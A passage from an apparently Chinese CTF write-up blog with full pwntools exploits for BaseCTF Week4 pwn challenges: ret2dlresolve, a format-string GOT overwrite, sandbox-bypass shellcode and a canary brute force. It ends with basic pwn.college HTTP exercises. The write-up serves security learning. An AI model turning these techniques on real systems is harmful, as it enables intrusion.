class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span><br><br><span class="hljs-comment"># p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>,<span class="hljs-number">32406</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment"># libc = ELF(&quot;./libc.so.6&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br>fakeLinkMap = elf.sym[<span class="hljs-string">&#x27;a&#x27;</span>] <span class="hljs-comment"># write to where</span><br>rbp = fakeLinkMap-<span class="hljs-number">8</span><br>main = <span class="hljs-number">0x40065d</span><br>pop_rdi = <span class="hljs-number">0x00000000004006f3</span> <span class="hljs-comment"># pop rdi ; ret</span><br>ret = <span class="hljs-number">0x40068d</span><br><br>offset = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]-libc.sym[<span class="hljs-string">&#x27;gets&#x27;</span>]<br>l_addr = offset <span class="hljs-keyword">if</span> offset&gt;=<span class="hljs-number">0</span> <span class="hljs-keyword">else</span> (<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">64</span>)+offset<br><br>linkmap = flat(&#123;<br>    <span class="hljs-number">0x0</span>: p64(l_addr), <span class="hljs-comment"># l_addr</span><br>    <span class="hljs-number">0x8</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># l_name</span><br>    <span class="hljs-number">0x10</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># l_ld</span><br>    <span class="hljs-number">0x18</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># l_next</span><br>    <span class="hljs-number">0x20</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># l_prev</span><br>    <span class="hljs-number">0x28</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># l_real</span><br>    <span class="hljs-number">0x30</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># l_ns</span><br>    <span class="hljs-number">0x38</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># l_libname</span><br>    <span class="hljs-number">0x40</span>: p64(<span class="hljs-number">0</span>), <span class="hljs-comment"># l_info</span><br>    <span class="hljs-number">0x68</span>: p64(fakeLinkMap+<span class="hljs-number">0x120</span>), <span class="hljs-comment"># l_info-&gt;DT_STRTAB</span><br>    <span class="hljs-number">0x70</span>: p64(fakeLinkMap+<span class="hljs-number">0x110</span>), <span class="hljs-comment"># l_info-&gt;DT_SYMTAB</span><br>    <span class="hljs-number">0xf8</span>: p64(fakeLinkMap+<span class="hljs-number">0x100</span>), <span class="hljs-comment"># l_info-&gt;DT_JMPREL</span><br>&#125;, filler = <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>linkmap = linkmap.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>linkmap += p64(<span class="hljs-number">0x17</span>) <span class="hljs-comment"># DT_JMPREL</span><br>linkmap += p64(fakeLinkMap+<span class="hljs-number">0x130</span>) <br>linkmap += p64(<span class="hljs-number">0x6</span>) <span class="hljs-comment"># DT_SYMTAB</span><br>linkmap += p64(elf.got[<span class="hljs-string">&#x27;gets&#x27;</span>]-<span class="hljs-number">0x8</span>) <br>linkmap += p64(<span class="hljs-number">0x5</span>) <span class="hljs-comment"># DT_STRTAB</span><br>linkmap += p64(fakeLinkMap+<span class="hljs-number">0x150</span>)<br>linkmap = linkmap.ljust(<span class="hljs-number">0x130</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>linkmap += p64(fakeLinkMap+<span class="hljs-number">0x148</span>-offset) <span class="hljs-comment"># fake_JMPREL-&gt;r_offset</span><br>linkmap += p64(<span class="hljs-number">0x7</span>) <span class="hljs-comment"># fake_JMPREL-&gt;r_info</span><br>linkmap += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># fake_RMPREL-&gt;r_addend</span><br>linkmap += p64(<span class="hljs-number">0</span>) <span class="hljs-comment"># fake_got</span><br>linkmap = linkmap.ljust(<span class="hljs-number">0x150</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>linkmap += <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span><br>payload += p64(rbp)<br> <br><span class="hljs-comment">#将FakeLinkMap写入bss段中</span><br>payload += p64(pop_rdi)<br>payload += p64(fakeLinkMap)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;gets&#x27;</span>])<br><span class="hljs-comment">#将FakeLinkMap写入bss段中</span><br> <br><span class="hljs-comment">#将/bin/sh作为参数push进rdi</span><br>payload += p64(pop_rdi)<br>payload += p64(fakeLinkMap + <span class="hljs-number">0x150</span>)<br><span class="hljs-comment">#将/bin/sh作为参数push进rdi</span><br> <br><span class="hljs-comment"># payload += p64(ret)#平衡栈,本题远程不需要但本地需要</span><br>payload += p64(<span class="hljs-number">0x4004E6</span>)<span class="hljs-comment">#跳转至plt0查询函数</span><br>payload += p64(fakeLinkMap)<span class="hljs-comment">#fakeLinkMap作为l参数</span><br>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment">#0为参数reloc_args</span><br>payload += p64(main)<br><br>p.sendline(payload)<br>p.sendline(linkmap)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Week4-format-string-level3"><a href="#Week4-format-string-level3" class="headerlink" title="[Week4] format_string_level3"></a>[Week4] format_string_level3</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>先利用格式化字符串漏洞修改stack_chk_fail_got，以便于任意次调用main函数<br>然后改掉printf_got</p><h3 id="exp-17"><a href="#exp-17" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br>p = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br><span class="hljs-comment"># p = remote(&quot;challenge.basectf.fun&quot;,48553)</span><br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br>stack_chk_fail_got = elf.got[<span class="hljs-string">&quot;__stack_chk_fail&quot;</span>]<br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>main = <span class="hljs-number">0x40121F</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x12</span><br>payload += <span class="hljs-string">b&quot;%37$hhn&quot;</span><br>payload = payload.ljust(<span class="hljs-number">0x1F</span>+<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;b&#x27;</span>)<br>payload += <span class="hljs-string">b&quot;%38$hhn&quot;</span><br>payload = payload.ljust(<span class="hljs-number">0x40</span>+<span class="hljs-number">14</span>,<span class="hljs-string">b&#x27;c&#x27;</span>)<br>payload += <span class="hljs-string">b&quot;%39$n&quot;</span><br>payload = payload.ljust(<span class="hljs-number">272</span>-<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;d&#x27;</span>)<br>payload += p64(stack_chk_fail_got+<span class="hljs-number">1</span>) + p64(stack_chk_fail_got) + p64(stack_chk_fail_got+<span class="hljs-number">2</span>)<br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;d&#x27;</span>)<br>payload = <span class="hljs-string">b&#x27;e&#x27;</span>*<span class="hljs-number">8</span><br>payload += <span class="hljs-string">b&#x27;%39$s&#x27;</span><br>payload = payload.ljust(<span class="hljs-number">272</span>-<span class="hljs-number">0x8</span>,<span class="hljs-string">b&#x27;f&#x27;</span>)<br>payload += p64(printf_got)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;e&#x27;</span>*<span class="hljs-number">8</span>)<br>printf_addr = u64(p.recv()[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = printf_addr - libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>log.success(<span class="hljs-string">&quot;libc_base -&gt; &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>system_byte = [<br>    (p64(system_addr)[<span class="hljs-number">0</span>],<span class="hljs-number">0</span>),<br>    (p64(system_addr)[<span class="hljs-number">1</span>],<span class="hljs-number">1</span>),<br>    (p64(system_addr)[<span class="hljs-number">2</span>],<span class="hljs-number">2</span>),<br>    (p64(system_addr)[<span class="hljs-number">3</span>],<span class="hljs-number">3</span>),<br>    (p64(system_addr)[<span class="hljs-number">4</span>],<span class="hljs-number">4</span>),<br>    (p64(system_addr)[<span class="hljs-number">5</span>],<span class="hljs-number">5</span>),<br>    ]<br>system_byte = <span class="hljs-built_in">sorted</span>(system_byte)<br><span class="hljs-built_in">print</span>(system_byte)<br><span class="hljs-keyword">assert</span> system_byte[-<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] &lt; (<span class="hljs-number">272</span>-<span class="hljs-number">0x30</span>-<span class="hljs-number">7</span>)<br><br>payload = system_byte[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-string">b&#x27;g&#x27;</span><br>payload += <span class="hljs-string">b&quot;%34$hhn&quot;</span><br>payload = payload.ljust(system_byte[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>]+<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;h&#x27;</span>)<br>payload += <span class="hljs-string">b&quot;%35$hhn&quot;</span><br>payload = payload.ljust(system_byte[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>]+<span class="hljs-number">14</span>,<span class="hljs-string">b&#x27;i&#x27;</span>)<br>payload += <span class="hljs-string">b&quot;%36$hhn&quot;</span><br>payload = payload.ljust(system_byte[<span class="hljs-number">3</span>][<span class="hljs-number">0</span>]+<span class="hljs-number">21</span>,<span class="hljs-string">b&#x27;j&#x27;</span>)<br>payload += <span class="hljs-string">b&quot;%37$hhn&quot;</span><br>payload = payload.ljust(system_byte[<span class="hljs-number">4</span>][<span class="hljs-number">0</span>]+<span class="hljs-number">28</span>,<span class="hljs-string">b&#x27;k&#x27;</span>)<br>payload += <span class="hljs-string">b&quot;%38$hhn&quot;</span><br>payload = payload.ljust(system_byte[<span class="hljs-number">5</span>][<span class="hljs-number">0</span>]+<span class="hljs-number">35</span>,<span class="hljs-string">b&#x27;l&#x27;</span>)<br>payload += <span class="hljs-string">b&quot;%39$hhn&quot;</span><br>payload = payload.ljust(<span class="hljs-number">272</span>-<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;m&#x27;</span>)<br>payload += p64(printf_got+system_byte[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]) + p64(printf_got+system_byte[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]) + p64(printf_got+system_byte[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>])<br>payload += p64(printf_got+system_byte[<span class="hljs-number">3</span>][<span class="hljs-number">1</span>]) + p64(printf_got+system_byte[<span class="hljs-number">4</span>][<span class="hljs-number">1</span>]) + p64(printf_got+system_byte[<span class="hljs-number">5</span>][<span class="hljs-number">1</span>])<br><br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;g&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Week4-orz！"><a href="#Week4-orz！" class="headerlink" title="[Week4] orz！"></a>[Week4] orz！</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>沙箱禁用了execve、open、read、write<br>所以手写了openat、readw、writew的shellcode</p><h3 id="exp-18"><a href="#exp-18" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br><span class="hljs-comment">#p = process(&quot;./orz！&quot;)</span><br><span class="hljs-comment">#p = gdb.debug(&quot;./orz！&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>,<span class="hljs-number">39482</span>)<br>elf = ELF(<span class="hljs-string">&quot;./orz！&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rax,0x0067616c662f</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">mov rsi,rsp</span><br><span class="hljs-string">xor rdx,rdx</span><br><span class="hljs-string">mov rax,257</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,rax</span><br><span class="hljs-string">push 0x100</span><br><span class="hljs-string">mov rbx,rsp</span><br><span class="hljs-string">sub rbx,0x108</span><br><span class="hljs-string">push rbx</span><br><span class="hljs-string">mov rsi,rsp</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">mov rax,19</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rsi,rsp</span><br><span class="hljs-string">mov rdx,1</span><br><span class="hljs-string">mov rax,20</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>shellcode = asm(shellcode)<br>p.send(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Week4-没有-canary-我要死了"><a href="#Week4-没有-canary-我要死了" class="headerlink" title="[Week4] 没有 canary 我要死了!"></a>[Week4] 没有 canary 我要死了!</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>远程环境应该是ubuntu24.04</p><h3 id="exp-19"><a href="#exp-19" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    prog = <span class="hljs-string">&quot;./没有canary我要死了&quot;</span><br>    elf = ELF(prog)<br>    <span class="hljs-comment">#p = process(prog)</span><br>    p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>,<span class="hljs-number">28733</span>)<br><br>    libc = cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>    libc.srand(libc.time(<span class="hljs-number">0</span>))<br><br>    canary = <span class="hljs-string">b&#x27;\x00&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-number">9</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>            p.recvuntil(<span class="hljs-string">b&#x27;BaseCTF\n&#x27;</span>)<br>            test_canary = canary + j.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[\033[1;36mRunning\033[0m] explode the <span class="hljs-subst">&#123;i&#125;</span>th of canary, now try : <span class="hljs-subst">&#123;test_canary&#125;</span>&quot;</span>)<br>            p.sendline(<span class="hljs-built_in">str</span>(libc.rand()%<span class="hljs-number">50</span>).encode())<br>            p.recvuntil(<span class="hljs-string">b&#x27;welcome\n&#x27;</span>)<br>            payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">104</span> + test_canary<br>            p.send(payload)<br>            respone = p.recvline()<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;cheer on&#x27;</span> <span class="hljs-keyword">in</span> respone:<br>                canary = test_canary<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> i==<span class="hljs-number">255</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[\033[1;31mError\033[0m] explode fail&quot;</span>)<br>                    exit(-<span class="hljs-number">1</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[\033[1;32mSuccess\033[0m] canary : <span class="hljs-subst">&#123;canary&#125;</span>&quot;</span>)<br><br>    shell = <span class="hljs-number">0x02b1</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;BaseCTF\n&#x27;</span>)<br>    <span class="hljs-keyword">for</span> pie <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">16</span>):<br>        p.sendline(<span class="hljs-built_in">str</span>(libc.rand()%<span class="hljs-number">50</span>).encode())<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[\033[1;36mRunning\033[0m] explode pie, now try : <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(pie)&#125;</span>&quot;</span>)<br>        payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">104</span> + canary + p64(<span class="hljs-number">0</span>) + p16((pie&lt;&lt;<span class="hljs-number">0xc</span>)+shell)<br>        p.recvuntil(<span class="hljs-string">b&#x27;welcome\n&#x27;</span>)<br>        p.send(payload)<br>        respone = p.recvline()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&quot;BaseCTF&#123;&quot;</span> <span class="hljs-keyword">in</span> respone:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[\033[1;32mSuccess\033[0m] flag : <span class="hljs-subst">&#123;respone&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><br>    p.interactive()<br><br>exp()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn.college</title>
      <link href="/2024/09/01/pwn-college/"/>
      <url>/2024/09/01/pwn-college/</url>
      
        <content type="html"><![CDATA[<p>pwn.college，稍微写了几个版块，后边的先鸽了</p><span id="more"></span><blockquote><p><a href="https://pwn.college/">https://pwn.college</a></p></blockquote><h1 id="intro-to-cybersecurity"><a href="#intro-to-cybersecurity" class="headerlink" title="intro to cybersecurity"></a>intro to cybersecurity</h1><h2 id="talking-web"><a href="#talking-web" class="headerlink" title="talking-web"></a>talking-web</h2><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>HTTP是一个应用层协议</p><p>有关会话层的TCP、UDP协议，网络层的IP协议，数据链路层的以太网协议将会在pwn.college的<a href="#intercepting-communication">intercepting-communication</a>部分中提到</p><h4 id="HTTP-request"><a href="#HTTP-request" class="headerlink" title="HTTP request"></a>HTTP request</h4><p>下面是HTTP请求的主要结构</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+-------------+----------------------------+------------------------------------------------+<br>|<span class="hljs-string">format       </span>|<span class="hljs-string">GET exapmle                 </span>|<span class="hljs-string">POST example                                    </span>|<br>+-------------+----------------------------+------------------------------------------------+<br>|<span class="hljs-string">request line </span>|<span class="hljs-string">GET /get?a=12&amp;b=34 HTTP/1.1 </span>|<span class="hljs-string">POST /post HTTP/1.1                             </span>|<br>|<span class="hljs-string">header       </span>|<span class="hljs-string">Host: httpbin.org           </span>|<span class="hljs-string">Host: httpbin.org                               </span>|<br>|<span class="hljs-string">header       </span>|<span class="hljs-string">                            </span>|<span class="hljs-string">Content-Type: application/x-www-form-urlencoded </span>|<br>|<span class="hljs-string">header       </span>|<span class="hljs-string">                            </span>|<span class="hljs-string">Content-Length: 9                               </span>|<br>|<span class="hljs-string">blank line   </span>|<span class="hljs-string">                            </span>|<span class="hljs-string">                                                </span>|<br>|<span class="hljs-string">request data </span>|<span class="hljs-string">                            </span>|<span class="hljs-string">a=12&amp;b=34                                       </span>|<br>+-------------+----------------------------+------------------------------------------------+<br></code></pre></td></tr></table></figure><h3 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h3><h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><blockquote><p>Send an HTTP request</p></blockquote><h5 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80</span><br></code></pre></td></tr></table></figure><h5 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET / HTTP/1.1<br></code></pre></td></tr></table></figure><h5 id="python"><a href="#python" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br><br>response = requests.get(url)<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure><h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><blockquote><p>Set the host header in an HTTP request</p></blockquote><h5 id="curl-1"><a href="#curl-1" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 -H host:1c61bf39a9545b12f6fe638081f14f5c</span><br></code></pre></td></tr></table></figure><h5 id="nc-1"><a href="#nc-1" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET / HTTP/1.1<br>Host: c3b1fc17a0766e184c9af77b59799187<br></code></pre></td></tr></table></figure><h5 id="python-1"><a href="#python-1" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>host = <span 